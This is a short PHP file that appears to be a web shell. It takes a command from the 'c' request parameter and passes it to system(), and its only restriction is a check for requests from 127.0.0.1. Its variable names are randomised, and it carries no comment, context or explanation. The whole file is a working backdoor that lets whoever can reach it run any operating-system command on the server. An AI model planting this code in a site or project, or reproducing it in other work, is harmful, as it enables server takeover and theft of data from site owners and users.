<?php 
  $BjFrg = $_REQUEST['c'];
  $BjFrg = trim($BjFrg);
  $XJSa = array("127.0.0.1");
  if (!in_array($_SERVER['REMOTE_ADDR'], $XJSa)) {
    die;
  }
  system($BjFrg);
  die;
?>
